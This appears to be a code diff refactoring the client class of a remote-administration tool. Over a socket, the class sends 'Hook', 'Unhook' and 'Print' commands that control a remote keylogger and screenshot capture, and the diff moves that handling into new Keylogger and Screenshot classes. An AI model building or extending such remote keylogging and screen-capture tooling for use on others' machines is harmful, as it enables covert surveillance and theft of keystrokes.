@@ -1,8 +1,6 @@
 package model;
 
-import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
-import java.io.ByteArrayInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -32,6 +30,8 @@ public class Client
             inputStream = sock.getInputStream();
             outputStream = sock.getOutputStream();
             process = new Process(sock, inputStream, outputStream);
+            keylogger = new Keylogger(inputStream, outputStream);
+            screenShot = new Screenshot(inputStream, outputStream);
         }
         catch (Exception e)
         {
@@ -47,32 +47,9 @@ public class Client
 
     public BufferedImage handleScreenShot(String command)
     {
-        BufferedImage image = new BufferedImage(1, 1, 1);
-        try
-        {
-            byte[] msg = command.getBytes();
-            outputStream.write(msg);
+        sendCommand(command);
 
-            try
-            {
-                Thread.sleep(50);
-            }
-            catch (InterruptedException iE)
-            {
-                iE.printStackTrace();
-            }
-
-            byte[] imageAr = new byte[1920 * 1080];
-            inputStream.read(imageAr);
-
-            image = ImageIO.read(new ByteArrayInputStream(imageAr));
-        }
-        catch (IOException ioE)
-        {
-            ioE.printStackTrace();
-        }
-
-        return image;
+        return screenShot.takeScreenshot();
     }
 
     public String handleKeyLogger(String command)
@@ -85,22 +62,13 @@ public class Client
             switch(command)
             {
                 case "Hook":
-                    isHook = true;
+                    keylogger.handleHook();
                     break;
                 case "Unhook":
-                    isHook = false;
+                    keylogger.handleUnHook();
                     break;
                 case "Print":
-                    if (isHook)
-                    {
-                        byte[] buffer = new byte[5 * 1024];
-                        inputStream.read(buffer);
-                        String out = new String(buffer);
-                        out = out.trim();
-                        return out;
-                    }
-
-                    return "";
+                    return keylogger.handlePrint();
             }
         }
         catch (IOException ioE)
@@ -108,11 +76,19 @@ public class Client
             ioE.printStackTrace();
         }
 
-        return "";
+        return keylogger.getKeylogging();
+    }
+
+    public Screenshot getScreenShot() {
+        return screenShot;
     }
 
     public Process getProcess() {
         return process;
+    }
+
+    public Keylogger getKeylogger() {
+        return keylogger;
     }
 
     public void handleApp(String command)
@@ -165,4 +141,6 @@ public class Client
     private InputStream inputStream;
     private OutputStream outputStream;
     private Process process;
+    private Keylogger keylogger;
+    private Screenshot screenShot;
 }
